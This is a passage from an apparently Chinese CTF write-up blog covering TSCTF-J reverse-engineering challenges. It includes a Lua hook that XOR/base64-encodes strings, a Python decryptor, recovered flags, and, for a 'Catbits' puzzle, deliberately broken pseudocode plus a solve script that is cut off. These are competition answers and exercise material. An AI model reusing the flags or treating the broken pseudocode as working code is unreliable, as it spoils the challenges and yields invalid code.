class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">xor_byte</span><span class="params">(a, b)</span></span></span><br><span class="line">    <span class="keyword">local</span> result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">0</span>, <span class="number">7</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> x = a % <span class="number">2</span></span><br><span class="line">        <span class="keyword">local</span> y = b % <span class="number">2</span></span><br><span class="line">        result = result + ((x ~ y) &lt;&lt; i)</span><br><span class="line">        a = <span class="built_in">math</span>.<span class="built_in">floor</span>(a / <span class="number">2</span>)</span><br><span class="line">        b = <span class="built_in">math</span>.<span class="built_in">floor</span>(b / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span><span class="params">(str, key)</span></span></span><br><span class="line">    <span class="keyword">local</span> result = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span>, #str <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> c = <span class="built_in">string</span>.<span class="built_in">byte</span>(str, i)</span><br><span class="line">        c = (c + <span class="number">1</span>) % <span class="number">255</span></span><br><span class="line">        <span class="keyword">local</span> k = <span class="built_in">string</span>.<span class="built_in">byte</span>(key, (i - <span class="number">1</span>) % #key + <span class="number">1</span>)</span><br><span class="line">        result[i] = <span class="built_in">string</span>.<span class="built_in">char</span>(xor_byte(c, k))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">table</span>.<span class="built_in">concat</span>(result)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- base64 encode</span></span><br><span class="line"><span class="keyword">local</span> b=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64_encode</span><span class="params">(data)</span></span></span><br><span class="line">    <span class="keyword">return</span> ((data:<span class="built_in">gsub</span>(<span class="string">&#x27;.&#x27;</span>, <span class="function"><span class="keyword">function</span><span class="params">(x)</span></span></span><br><span class="line">        <span class="keyword">local</span> r,bits=<span class="string">&#x27;&#x27;</span>,<span class="built_in">string</span>.<span class="built_in">byte</span>(x)</span><br><span class="line">        <span class="keyword">for</span> i=<span class="number">8</span>,<span class="number">1</span>,<span class="number">-1</span> <span class="keyword">do</span> r=r..(bits % <span class="number">2</span>^i - bits % <span class="number">2</span>^(i<span class="number">-1</span>) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;0&#x27;</span>) <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="keyword">end</span>)..<span class="string">&#x27;0000&#x27;</span>):<span class="built_in">gsub</span>(<span class="string">&#x27;%d%d%d?%d?%d?%d?&#x27;</span>, <span class="function"><span class="keyword">function</span><span class="params">(x)</span></span></span><br><span class="line">        <span class="keyword">if</span> #x &lt; <span class="number">6</span> <span class="keyword">then</span> <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">local</span> c=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i=<span class="number">1</span>,<span class="number">6</span> <span class="keyword">do</span> c=c+(x:<span class="built_in">sub</span>(i,i)==<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">2</span>^(<span class="number">6</span>-i) <span class="keyword">or</span> <span class="number">0</span>) <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> b:<span class="built_in">sub</span>(c+<span class="number">1</span>,c+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">end</span>)..(&#123; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, <span class="string">&#x27;=&#x27;</span> &#125;)[#data % <span class="number">3</span> + <span class="number">1</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">(plain, key)</span></span></span><br><span class="line">    <span class="keyword">return</span> base64_encode(xor_encrypt(plain, key))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func_enter</span><span class="params">(args)</span></span></span><br><span class="line">    <span class="keyword">local</span> strobj = args[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">local</span> str = getJavaStringContent(strobj)</span><br><span class="line">    <span class="keyword">local</span> encrypted = encrypt(str, <span class="string">&quot;W0WY0U4R3S0G00D2F1NDTH3K3Y&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> e1 = createJavaString(strobj, encrypted)</span><br><span class="line">    args[<span class="number">1</span>] = e1</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>, args, <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">FAKE_B64 = <span class="string">&quot;AmQTDHd7fy5CIAQyRUokVD1RJ3VlJFM4WTE+CBcn&quot;</span></span><br><span class="line">KEY = <span class="string">b&quot;W0WY0U4R3S0G00D2F1NDTH3K3Y&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_byte</span>(<span class="params">a, b</span>):</span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        r |= ((a &amp; <span class="number">1</span>) ^ (b &amp; <span class="number">1</span>)) &lt;&lt; i</span><br><span class="line">        a &gt;&gt;= <span class="number">1</span></span><br><span class="line">        b &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">fake_b64, key_bytes</span>):</span><br><span class="line">    cipher = base64.b64decode(fake_b64)</span><br><span class="line">    plain = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher):</span><br><span class="line">        k = key_bytes[i % <span class="built_in">len</span>(key_bytes)]</span><br><span class="line">        t = xor_byte(c, k)</span><br><span class="line">        p = (t - <span class="number">1</span>) % <span class="number">255</span>  <span class="comment"># 逆向 “加 1 再取模 255” 的操作</span></span><br><span class="line">        plain.append(p)</span><br><span class="line">    <span class="keyword">return</span> plain.decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    real_flag = decrypt(FAKE_B64, KEY)</span><br><span class="line">    <span class="built_in">print</span>(real_flag)</span><br></pre></td></tr></table></figure><p>TSCTF-J{pr3tty_ez_h00k_righ7?}</p><h3 id="Catbits"><a href="#Catbits" class="headerlink" title="Catbits"></a>Catbits</h3><p>第二天上了一上午一下午的课，看了下思路偏了</p><p>解压出来有个json</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013173158574.png" alt="image-20251013173158574"></p><p>纯手搓了一下午，分析对象之间的调用关系，还真给我分析出来了</p><p>有个nibble swap：((x &amp; 0xF) &lt;&lt; 4) | ((x &gt;&gt; 4) &amp; 0xF)</p><p>arc_bravo[i] &#x3D; after_charlie[i] XOR arc_bravo[i-1]</p><p>和idx[i] &#x3D; arc_bravo[i] - (i+1)</p><p>可能有个索引表qrazybox</p><p>最后写了个解密算法</p><p>出了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSCTF-J&#123;F`&#x27;*catcatPL~3` catcatcatcatJ catcat!*H&#125;</span><br></pre></td></tr></table></figure><p>包错的，第二天晚上突然看了下，发现</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013173525557.png" alt="image-20251013173525557"></p><p>每个角色都能点……</p><p>根本不用分析json T.T</p><p>这题其实就注意广播就行，还有细心点</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013174639309.png" alt="image-20251013174639309"></p><p>第三天做，感觉半小时能搞定结果，搞了四五个小时…</p><p>因为死活找不到Toko</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013173648870.png" alt="image-20251013173648870"></p><p>在这找到了最后</p><p>整理下逻辑</p><p>写了个超级伪代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">orc = []</span><br><span class="line">src = [<span class="number">211</span>,<span class="number">71</span>,<span class="number">210</span>,<span class="number">132</span>,<span class="number">193</span>,<span class="number">114</span>,<span class="number">244</span>,<span class="number">208</span>,<span class="number">213</span>,<span class="number">99</span>,<span class="number">37</span>,<span class="number">214</span>,<span class="number">224</span>,<span class="number">101</span>,<span class="number">98</span>,<span class="number">212</span>,<span class="number">224</span>,<span class="number">118</span>] <span class="comment">#从1开始</span></span><br><span class="line">arc = [] <span class="comment"># 长度为实际存储的 + 1，从1 开始</span></span><br><span class="line"><span class="comment"># 输入的往列表orc里存，从1开始</span></span><br><span class="line"><span class="comment"># 初始化arc</span></span><br><span class="line"><span class="comment"># 循环 arc</span></span><br><span class="line">qrazybox = [<span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;catcat&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br><span class="line">ind3x = <span class="number">1</span></span><br><span class="line">index1 = <span class="number">2</span></span><br><span class="line">arc[<span class="number">0</span>] = <span class="number">114</span></span><br><span class="line">orc = <span class="built_in">input</span></span><br><span class="line"><span class="keyword">for</span> ind3x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(orc) + <span class="number">1</span>):</span><br><span class="line">    t1 = <span class="number">0</span></span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> t1 = <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> qrazybox[index] = orc[ind3x]:</span><br><span class="line">            t1 = <span class="number">1</span></span><br><span class="line">            ret = index</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> index &gt; <span class="built_in">len</span>(qrazybox):</span><br><span class="line">            ret = ???</span><br><span class="line">            t1 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ret !=???:</span><br><span class="line">        arc.append[ret]</span><br><span class="line">        orc[ind3x] = qrazybox[ret]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ar = ?</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nonono&quot;</span>)</span><br><span class="line"></span><br><span class="line">ar = ind3x</span><br><span class="line">inde3x = <span class="number">1</span></span><br><span class="line">index1 = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index1,<span class="built_in">len</span>(arc)+ <span class="number">1</span>):</span><br><span class="line">    b1 = arc[i]</span><br><span class="line">    k = b1 + i</span><br><span class="line">    <span class="keyword">if</span> k &gt; <span class="number">255</span>:</span><br><span class="line">        bm = k - <span class="number">255</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bm = k</span><br><span class="line">    arc[i] = bm</span><br><span class="line"></span><br><span class="line">index1 = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index1,<span class="built_in">len</span>(arc)+ <span class="number">1</span>):</span><br><span class="line">    cr = <span class="number">0</span></span><br><span class="line">    c1 = 四舍五入(arc[i])</span><br><span class="line">    c2 = 四舍五入(arc[i - <span class="number">1</span>])</span><br><span class="line">    c5 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> c1 == <span class="number">0</span> &amp;&amp; c2 ==<span class="number">0</span>:</span><br><span class="line">        c3 = c1除以<span class="number">2</span>的余数</span><br><span class="line">        c4 = c2除以<span class="number">2</span>的余数</span><br><span class="line">        c6 = (c3 + c4) 除以<span class="number">2</span>的余数</span><br><span class="line">        cr = cr + c5 * c6</span><br><span class="line">        c1 = 向下取整(c1/<span class="number">2</span>)</span><br><span class="line">        c2 = 向下取整(c2/<span class="number">2</span>)</span><br><span class="line">        c5 = c5 * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    arc[i] = cr</span><br><span class="line"></span><br><span class="line">index1 = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index1,<span class="built_in">len</span>(arc)+ <span class="number">1</span>):</span><br><span class="line">    deltaa = 四舍五入(arc[i])</span><br><span class="line">    deltab = (deltaa除以<span class="number">16</span>的余数)</span><br><span class="line">    deltac = deltab * <span class="number">16</span></span><br><span class="line">    delta_ret = deltac</span><br><span class="line">    ea = 四舍五入(arc[i])</span><br><span class="line">    ei = (ea除以<span class="number">16</span>的余数)</span><br><span class="line">    eu = ea - ei</span><br><span class="line">    ee = 向下取整(eu/<span class="number">16</span>)</span><br><span class="line">    e_ret = ee</span><br><span class="line">    f1 = delta_ret</span><br><span class="line">    f2 = e_ret</span><br><span class="line">    cha_ret = <span class="number">0</span></span><br><span class="line">    cha1 = 四舍五入(f1)</span><br><span class="line">    cha2 = 四舍五入(f2)</span><br><span class="line">    cha5 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> cha1 == <span class="number">0</span> &amp;&amp; cha2 ==<span class="number">0</span>:</span><br><span class="line">        cha3 = cha1除以<span class="number">2</span>的余数</span><br><span class="line">        cha4 = cha2除以<span class="number">2</span>的余数</span><br><span class="line">        <span class="keyword">if</span> cha3 ==<span class="number">1</span> 或 cha4 == <span class="number">1</span>:</span><br><span class="line">            cha6 = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cha6 = <span class="number">0</span></span><br><span class="line">        char = char + cha5 * cha6</span><br><span class="line">        cha1 = 向下取整(cha1/<span class="number">2</span>)</span><br><span class="line">        cha2 = 向下取整(cha2/<span class="number">2</span>)</span><br><span class="line">        cha5 = cha5 * <span class="number">2</span></span><br><span class="line">    arc[i] = char</span><br><span class="line"></span><br><span class="line">index1 = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(src) != <span class="built_in">len</span>(arc) -<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Nonono&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index1,<span class="built_in">len</span>(arc) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> arc[i] != src[i - <span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Nonono&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你过关&quot;</span>)</span><br></pre></td></tr></table></figure><p>跟之前的json对照了下得到主逻辑，挺简单的差不多</p><p>结果又卡住了</p><p>没有注意到初始值是2</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013173921845.png" alt="image-20251013173921845"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">src = [<span class="number">211</span>, <span class="number">71</span>, <span class="number">210</span>, <span class="number">132</span>, <span class="number">193</span>, <span class="number">114</span>, <span class="number">244</span>, <span class="number">208</span>, <span class="number">213</span>, <span class="number">99</span>, <span class="number">37</span>, <span class="number">214</span>, <span class="number">224</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">212</span>, <span class="number">224</span>, <span class="number">118</span>]</span><br><span class="line"></span><br><span class="line">qrazy = [<span class="string">&#x27;catcat&#x27;</span>] * <span class="number">32</span> + [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;`&#x27;</span>] \</span><br><span class="line">        + [<span class="string">&#x27;catcat&#x27;</span>] * <span class="number">26</span> + [<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br><span class="line">lookup = &#123;ch: i + <span class="number">1</span> <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(qrazy) <span class="keyword">if</span> ch != <span class="string">&#x27;catcat&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((x &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((x &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 